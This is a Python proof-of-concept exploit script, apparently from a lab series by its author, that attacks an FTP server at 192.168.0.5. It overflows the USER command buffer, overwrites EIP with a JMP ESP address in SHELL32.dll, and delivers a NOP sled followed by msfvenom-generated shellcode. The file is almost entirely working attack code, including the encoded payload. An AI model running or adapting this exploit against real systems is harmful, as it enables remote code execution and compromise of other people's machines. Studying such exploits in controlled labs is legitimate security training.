#!/usr/bin/python
import socket

# Part 7 of proof of concept by Vry4n
# This script is intended full the buffer, modify EIP value with our JMP ESP value 7CB32F34, which refers to SHELL32.dll
# execute it, and then fill it with our shell code generated with msfvenom

# badchars \x00\x0a\x0d
# JMP ESP 0x7CB32F34, as this is intel processor this is read as little endian, see EIP variable
FUZZ = "A" * 230
EIP = b"\x34\x2F\xB3\x7C"
NOPS = b"\x90" * 32
shellcode = (b"\xba\x74\xcc\x7c\xa0\xd9\xe8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
b"\x52\x31\x55\x12\x03\x55\x12\x83\x99\x30\x9e\x55\x9d\x21\xdd"
b"\x96\x5d\xb2\x82\x1f\xb8\x83\x82\x44\xc9\xb4\x32\x0e\x9f\x38"
b"\xb8\x42\x0b\xca\xcc\x4a\x3c\x7b\x7a\xad\x73\x7c\xd7\x8d\x12"
b"\xfe\x2a\xc2\xf4\x3f\xe5\x17\xf5\x78\x18\xd5\xa7\xd1\x56\x48"
b"\x57\x55\x22\x51\xdc\x25\xa2\xd1\x01\xfd\xc5\xf0\x94\x75\x9c"
b"\xd2\x17\x59\x94\x5a\x0f\xbe\x91\x15\xa4\x74\x6d\xa4\x6c\x45"
b"\x8e\x0b\x51\x69\x7d\x55\x96\x4e\x9e\x20\xee\xac\x23\x33\x35"
b"\xce\xff\xb6\xad\x68\x8b\x61\x09\x88\x58\xf7\xda\x86\x15\x73"
b"\x84\x8a\xa8\x50\xbf\xb7\x21\x57\x6f\x3e\x71\x7c\xab\x1a\x21"
b"\x1d\xea\xc6\x84\x22\xec\xa8\x79\x87\x67\x44\x6d\xba\x2a\x01"
b"\x42\xf7\xd4\xd1\xcc\x80\xa7\xe3\x53\x3b\x2f\x48\x1b\xe5\xa8"
b"\xaf\x36\x51\x26\x4e\xb9\xa2\x6f\x95\xed\xf2\x07\x3c\x8e\x98"
b"\xd7\xc1\x5b\x0e\x87\x6d\x34\xef\x77\xce\xe4\x87\x9d\xc1\xdb"
b"\xb8\x9e\x0b\x74\x52\x65\xdc\xbb\x0b\x65\x08\x54\x4e\x65\x21"
b"\xf8\xc7\x83\x2b\x10\x8e\x1c\xc4\x89\x8b\xd6\x75\x55\x06\x93"
b"\xb6\xdd\xa5\x64\x78\x16\xc3\x76\xed\xd6\x9e\x24\xb8\xe9\x34"
b"\x40\x26\x7b\xd3\x90\x21\x60\x4c\xc7\x66\x56\x85\x8d\x9a\xc1"
b"\x3f\xb3\x66\x97\x78\x77\xbd\x64\x86\x76\x30\xd0\xac\x68\x8c"
b"\xd9\xe8\xdc\x40\x8c\xa6\x8a\x26\x66\x09\x64\xf1\xd5\xc3\xe0"
b"\x84\x15\xd4\x76\x89\x73\xa2\x96\x38\x2a\xf3\xa9\xf5\xba\xf3"
b"\xd2\xeb\x5a\xfb\x09\xa8\x6b\xb6\x13\x99\xe3\x1f\xc6\x9b\x69"
b"\xa0\x3d\xdf\x97\x23\xb7\xa0\x63\x3b\xb2\xa5\x28\xfb\x2f\xd4"
b"\x21\x6e\x4f\x4b\x41\xbb")


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 21))
s.recv(1024)
s.send(b"USER " + FUZZ.encode() + EIP + NOPS + shellcode + b"\r\n")
s.close()
